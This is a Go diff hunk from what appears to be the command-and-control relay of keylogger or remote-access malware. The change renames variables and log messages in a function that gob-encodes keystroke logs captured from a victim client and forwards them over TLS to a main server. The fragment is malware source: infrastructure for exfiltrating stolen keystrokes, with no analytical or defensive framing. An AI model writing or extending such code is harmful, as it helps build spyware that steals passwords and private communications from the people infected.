@@ -235,17 +235,17 @@ func processCommandResult(clientUUID string, result types.GiveServerResult, main
     logger.Logf(logger.Debug, "Sent encoded response")
 }
 
-// processKeylogs processes and forwards the command result to the main server
-func processKeylogs(clientUUID string, result types.KeyReceive, mainConn *tls.Conn) {
-    logger.Logf(logger.Debug, "Sending command response: %v", result)
+// processKeylogs processes and forwards the keylogs to the main server
+func processKeylogs(clientUUID string, keylogs types.KeyReceive, mainConn *tls.Conn) {
+    logger.Logf(logger.Debug, "Sending keylogs: %v", keylogs)
 
-    // Use gob Encoder to send result directly over the connection
+    // Use gob Encoder to send keylogs directly over the connection
     encoder := gob.NewEncoder(mainConn)
-    err := encoder.Encode(result)
+    err := encoder.Encode(keylogs)
     if err != nil {
-        logger.Logf(logger.Error, "Error sending response: %v", err)
+        logger.Logf(logger.Error, "Error sending keylogs: %v", err)
     }
-    logger.Logf(logger.Debug, "Sent encoded response")
+    logger.Logf(logger.Debug, "Sent encoded keylogs")
 }
 
 // connectToMainServer establishes a TLS connection to the main server
